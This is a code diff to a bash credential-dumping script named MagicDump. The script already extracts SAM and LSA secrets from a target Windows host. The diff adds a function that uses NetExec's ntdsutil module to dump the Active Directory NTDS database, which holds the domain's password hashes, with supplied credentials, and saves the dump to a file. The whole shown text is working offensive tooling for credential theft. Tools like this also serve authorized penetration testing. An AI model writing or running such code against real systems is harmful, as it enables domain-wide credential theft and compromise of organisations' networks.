@@ -174,6 +174,23 @@ dump_lsa() {
   fi
 }
 
+# Function to execute NTDS dump using ntdsutil
+dump_ntds() {
+  local output_file="$DUMP_DIR/NTDS_dump_${TARGET_HOST}.txt"
+  local cmd="nxc smb $TARGET_HOST -u $USERNAME -p '$PASSWORD' -M ntdsutil"
+
+  add_log "Starting NTDS dump using ntdsutil..."
+  if run_command "$cmd > '$output_file' 2>/dev/null"; then
+    [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} NTDS dump completed successfully. Output saved to $output_file"
+    log_operation "NTDS" "success" "\"file_path\": \"$output_file\", \"method\": \"ntdsutil\""
+    add_log "NTDS dump saved to $output_file"
+  else
+    [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} NTDS dump failed. Check permissions or connectivity."
+    log_operation "NTDS" "failed" "\"error\": \"Failed to dump NTDS using ntdsutil\""
+    add_warning "Failed to dump NTDS on target $TARGET_HOST using ntdsutil"
+  fi
+}
+
 # Main script logic
 add_log "Starting MagicDump against target $TARGET_HOST"
 add_log "Authenticating as user '$USERNAME'..."
@@ -183,6 +200,9 @@ dump_sam
 
 # Execute LSA dump
 dump_lsa
+
+# Execute NTDS dump (ntdsutil method)
+dump_ntds
 
 # Display summary to user (without JSON dump)
 echo -e "${GREEN}[INFO]${RESET} Dumping complete. Logs saved to $LOG_FILE."
